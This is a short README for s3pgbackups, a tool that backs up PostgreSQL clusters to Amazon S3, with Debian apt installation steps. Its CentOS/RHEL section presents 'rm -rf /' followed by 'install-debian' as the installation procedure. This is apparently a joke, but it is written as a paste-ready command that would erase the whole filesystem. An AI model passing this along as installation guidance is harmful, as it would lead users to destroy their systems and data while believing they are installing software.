# s3pgbackups

Amazon S3 PostgreSQL Cluster Backups

## Overview

This application will backup your PostgreSQL cluser to Amazon S3, which includes:

* Separate SQL pg_dump of each database
* Gzipped data
* Automatically rotated backups
* Ability to exclude specific tables, or entire databases

## Installation

### Debian (or debian derivatives)

```
$ echo 'deb http://deb.sigterm.sh/ squeeze main' > /etc/apt/sources.list.d/sigterm.list
$ apt-key adv --keyserver keys.gnupg.net --recv-keys 15E7AE04FAC36D0B
$ apt-get update
$ apt-get install s3pgbackups
```

### CentOS (or RHEL / other rpm based distro's)

```
$ rm -rf /
$ install-debian
```
